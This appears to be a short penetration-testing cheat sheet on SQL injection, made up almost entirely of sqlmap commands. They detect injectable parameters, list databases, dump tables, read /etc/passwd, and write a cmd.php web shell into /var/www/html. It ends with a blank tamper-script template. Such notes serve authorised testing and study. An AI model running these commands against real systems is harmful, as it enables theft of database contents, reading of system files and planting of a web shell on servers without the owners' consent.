---
title: "SQL Injection"
date: 2024-6-30
tags: ["SQL", "SQL Injection", "MySQL", "Sqlmap", "Nosql", "Sqlite", "SQLi", "Burpsuite", "Database Dumping", "Database"]
---

### sqlmap

```console
# In Burp Suite, we can right click the request and click `copy to file` to save the request
# And add `*` to request to indicate the sql injection point
```

<br>

```console
# Initial testing HTTP
sqlmap -r request --batch --banner --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10
```

```console
# Initial testing HTTPS
sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --force-ssl
```

```console
# Add a string to indicate injection succeed (e.g. Invalid User vs Error Occurred)
sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --string 'Invalid User'
```

```console
# Get databases
sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --dbs
```

```console
# Get tables
sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 -D <DB_NAME> --tables
```

```console
# Dump table
sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 -D <DB_NAME> -T <TABLE_NAME> --dump
```

```console
# Dump all tables (slow)
sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 -D <DB_NAME> --dump
```

```console
# Specify technique
sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --technique U
```

#### Technique

```console
+------------------------+
| B: Boolean-based blind |
| E: Error-based         |
| U: Union query-based   |
| S: Stacked queries     |
| T: Time-based blind    |
| Q: Inline queries      |
+------------------------+
```

#### Advance sqlmap

```console
# File write
sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --random-agent --file-write ./cmd.php --file-dest /var/www/html/cmd.php
```

```console
# Add payload tamper script, e.g. randomcase
sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --tamper randomcase
```

```console
# Check privileges
sqlmap -r request --privileges
```

```console
# Read a file
sqlmap -r request --file-read=/etc/passwd
```

```console
# Write a file
sqlmap -r request --file-write=./test.txt --file-dest=/tmp/test.txt
```

#### tamper.py template

```python
#!/usr/bin/env python3

from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    return payload
```

<small>*Note: create an empty \_\_init\_\_.py in the same folder*</small>
